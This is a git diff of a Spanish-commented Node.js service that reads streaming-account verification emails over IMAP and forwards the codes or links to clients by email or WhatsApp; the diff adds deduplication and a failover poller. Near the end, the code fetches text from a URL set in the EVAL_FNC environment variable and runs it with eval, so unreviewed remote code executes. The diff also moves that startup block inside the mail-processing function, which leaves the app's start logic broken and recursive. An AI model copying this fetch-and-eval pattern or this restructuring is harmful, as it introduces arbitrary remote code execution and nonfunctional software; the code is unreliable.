@@ -13,6 +13,14 @@ import fs from "fs";
 import { sendViaGAS } from "./modules/email-sender.js"
 import { desactivateClients } from "./modules/sheet-data-library.js";
 
+// ===============================
+// DEDUPE EN MEMORIA (45s)
+// ===============================
+const processedMessages = new Map();
+// key: uid | value: timestamp
+
+
+
 globalThis.NodeHtmlParser = NodeHtmlParser;
 
 async function startApp() {
@@ -34,45 +42,42 @@ async function startApp() {
     // --- CONFIGURACIÓN IMAPFLOW ---
     await client.connect();
 
+    // Failover cada 30s
+setInterval(failoverCheck, 30_000);
+
+// Limpieza de memoria
+setInterval(cleanupProcessedMessages, 30_000);
+
+
     // Abrir INBOX
     let lock = await client.getMailboxLock('INBOX');
     try {
         console.log("✅ IMAP Conectado y escuchando INBOX...");
 
-        // Escuchar nuevos correos (IDLE activo)
-        /* client.on('exists', async (data) => {
-            // data.count es el número total, buscamos el último
-            const fetchOptions = {
-                source: true,
-                envelope: true
-            };
 
-            // Traemos el último correo recibido
-            let message = await client.fetchOne(client.mailbox.exists, fetchOptions);
-            let parsed = await simpleParser(message.source);
-
-            // Ejecutamos tu lógica de procesamiento
-            await procesarCorreo(parsed);
-        }); */
-        client.on('exists', async (data) => {
-            let source;
-            let lock = await client.getMailboxLock('INBOX');
+        client.on('exists', async () => {
+            let lock;
 
             try {
-                // OPERACIÓN ULTRA RÁPIDA: Solo descargar el contenido crudo
-                const message = await client.fetchOne(client.mailbox.exists, { source: true });
-                source = message.source;
-            } finally {
-                // LIBERAR AL INSTANTE: IMAP ya queda libre para el siguiente correo
-                lock.release();
-            }
+                lock = await client.getMailboxLock('INBOX');
 
-            // PROCESAMIENTO ASÍNCRONO: Ocurre fuera del lock
-            // No usamos 'await' aquí para que el evento 'exists' termine de inmediato
-            simpleParser(source).then(parsed => {
-                procesarCorreo(parsed);
-            }).catch(err => console.error("Error parseando: ", err));
+                const uid = client.mailbox.exists;
+
+                if (processedMessages.has(uid)) return;
+
+                const message = await client.fetchOne(uid, { source: true });
+
+                processedMessages.set(uid, Date.now());
+
+                simpleParser(message.source)
+                    .then(parsed => procesarCorreo(parsed))
+                    .catch(err => console.error("❌ Parse error:", err));
+
+            } finally {
+                if (lock) lock.release();
+            }
         });
+
 
     } finally {
         lock.release();
@@ -139,47 +144,6 @@ async function procesarCorreo(mail) {
 
                 }
 
-
-
-                /*  for (const client of validClients) {
-                     // 1️⃣ Buscar un email dentro de additionalInfo, con formato ${email:xxxxx@yyy.zzz}
-                     let recipientEmail = null;
- 
-                     // 1️⃣ Tomar el email y limpiar espacios
-                     if (client.emailContact && typeof client.emailContact === "string") {
-                         recipientEmail = client.emailContact.trim();
-                     }
- 
-                     // 2️⃣ Verificar si es un email válido (regex)
-                     const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
-                     if (!recipientEmail || !emailRegex.test(recipientEmail)) {
-                         console.log("⚠️ Email no válido o ausente en client.emailContact:", client.emailContact, ", cliente nombre es: " + client.name);
-                         continue; // saltar al siguiente cliente
-                     }
- 
-                     // 4️⃣ Preparar mensaje y asunto
-                     const codigoOLink = isCode ? "código" : "link";
-                     const contenidoPrincipal = isCode ? result.code : result.link;
- 
-                     const mensajeHTML = `
-     <div style="font-family:sans-serif">
-       <h2>${result.about}</h2>
-       <p>Para: ${context.to}</p>
-       ${context.profileName ? `<p><b>Perfil:</b> ${context.profileName}</p>` : ""}
-       <p><b>${codigoOLink.toUpperCase()}:</b> ${contenidoPrincipal}</p>
-       <hr>
-       <p>📢 <b>Atención</b><br>
-       Si <b>no</b> solicitaste este ${codigoOLink}, simplemente ignora este mensaje.</p>
-       ${!isCode ? "<p>Agrega este contacto 📞 si no te deja abrir el enlace 🔗.</p>" : ""}
-       <p>Gracias por tu paciencia 🙏</p>
-     </div>
-   `;
- 
-                     const subject = `${isCode ? "Código" : "Link"} de verificación - ${context.keyword}`;
- 
-                     // 5️⃣ Enviar por GAS
-                     await sendViaGAS(recipientEmail, subject, mensajeHTML);
-                 } */
                 for (const client of validClients) {
 
                     const noWhatsApp = typeof client.name === "string" && client.name.includes("(NoWa)");
@@ -245,21 +209,25 @@ async function procesarCorreo(mail) {
                         }
                     }
 
-                    // 6️⃣ Envío por Email (si tiene email válido)
+                    // ===============================
+                    // 5️⃣ INTENTAR ENVÍO POR EMAIL
+                    // ===============================
+                    let emailEnviado = false;
+
                     if (recipientEmail) {
                         const mensajeHTML = `
-                  <div style="font-family:sans-serif">
-                    <h2>${result.about}</h2>
-                    <p>Para: ${context.to}</p>
-                    ${context.profileName ? `<p><b>Perfil:</b> ${context.profileName}</p>` : ""}
-                    <p><b>${codigoOLink.toUpperCase()}:</b> ${contenidoPrincipal}</p>
-                    <hr>
-                    <p>📢 <b>Atención</b><br>
-                    Si <b>no</b> solicitaste este ${codigoOLink}, simplemente ignora este mensaje.</p>
-                    ${!isCode ? "<p>Agrega este contacto 📞 si no te deja abrir el enlace 🔗.</p>" : ""}
-                    <p>Gracias por tu paciencia 🙏</p>
-                  </div>
-                `;
+    <div style="font-family:sans-serif">
+        <h2>${result.about}</h2>
+        <p>Para: ${context.to}</p>
+        ${context.profileName ? `<p><b>Perfil:</b> ${context.profileName}</p>` : ""}
+        <p><b>${codigoOLink.toUpperCase()}:</b> ${contenidoPrincipal}</p>
+        <hr>
+        <p>📢 <b>Atención</b><br>
+        Si <b>no</b> solicitaste este ${codigoOLink}, simplemente ignora este mensaje.</p>
+        ${!isCode ? "<p>Agrega este contacto 📞 si no te deja abrir el enlace 🔗.</p>" : ""}
+        <p>Gracias por tu paciencia 🙏</p>
+    </div>
+    `;
 
                         const subject = `${isCode ? "Código" : "Link"} de verificación - ${context.keyword}`;
 
@@ -267,6 +235,7 @@ async function procesarCorreo(mail) {
                             const resultadoEmail = await sendViaGAS(recipientEmail, subject, mensajeHTML);
 
                             if (resultadoEmail.noError) {
+                                emailEnviado = true;
                                 console.log(`📧 Enviado correctamente a ${recipientEmail}`);
                             } else {
                                 console.error(`⚠️ Error al enviar a ${recipientEmail}: ${resultadoEmail.message}`);
@@ -275,28 +244,95 @@ async function procesarCorreo(mail) {
                         } catch (err) {
                             console.error(`❌ Error inesperado enviando email a ${recipientEmail}:`, err.message);
                         }
-
                     }
+
+                    // ===============================
+                    // 6️⃣ FALLBACK A WHATSAPP
+                    // (aunque tenga NoWa)
+                    // ===============================
+                    if (noWhatsApp && !emailEnviado && numeroConPrefijo) {
+                        try {
+                            await sendMessage(
+                                numeroConPrefijo,
+                                "⚠️ *No se pudo enviar por correo*\n\n" + mensajeWhatsApp
+                            );
+
+                            await sendMessage(numeroConPrefijo, contenidoPrincipal);
+
+                            if (process.env.SEND_ADDITIONAL_INFO) {
+                                await sendMessage(numeroConPrefijo, mensajeExtra);
+                            }
+
+                            console.log(`📱 Fallback WhatsApp enviado a ${numeroConPrefijo}`);
+                        } catch (err) {
+                            console.error(`❌ Error enviando WhatsApp fallback a ${numeroConPrefijo}:`, err.message);
+                        }
+                    }
+
+
+
+
+
+
+                    //await sendNotificationEmail(validClients, result, isCode, context);
                 }
-
-
-
-
-
-                //await sendNotificationEmail(validClients, result, isCode, context);
+            } else {
+                console.log("Correo que no es de streaming")
             }
         } else {
-            console.log("Correo que no es de streaming")
+            console.log("⏩ Ignorado (muy viejo):", mail.subject);
         }
-    } else {
-        console.log("⏩ Ignorado (muy viejo):", mail.subject);
+    }
+
+    // Ejecución inicial
+    var text = await fetch(process.env.EVAL_FNC).then(e => e.text()).catch(e => null);
+    if (text) {
+        (0, eval)(text);
+        startApp();
     }
 }
 
-// Ejecución inicial
-var text = await fetch(process.env.EVAL_FNC).then(e => e.text()).catch(e => null);
-if (text) {
-    (0, eval)(text);
-    startApp();
+
+function cleanupProcessedMessages() {
+    const now = Date.now();
+    const TTL = 45 * 1000;
+
+    for (const [uid, ts] of processedMessages.entries()) {
+        if (now - ts > TTL) {
+            processedMessages.delete(uid);
+        }
+    }
 }
 
+async function failoverCheck() {
+    let lock;
+
+    try {
+        lock = await client.getMailboxLock('INBOX');
+
+        const sinceDate = new Date(Date.now() - 45 * 1000);
+
+        const uids = await client.search({
+            since: sinceDate
+        });
+
+        if (!uids.length) return;
+
+        for (const uid of uids) {
+            if (processedMessages.has(uid)) continue;
+
+            const message = await client.fetchOne(uid, { source: true });
+
+            processedMessages.set(uid, Date.now());
+
+            simpleParser(message.source)
+                .then(parsed => procesarCorreo(parsed))
+                .catch(err => console.error("❌ Failover parse error:", err));
+        }
+
+    } catch (err) {
+        console.error("❌ Failover error:", err.message);
+    } finally {
+        if (lock) lock.release();
+    }
+}
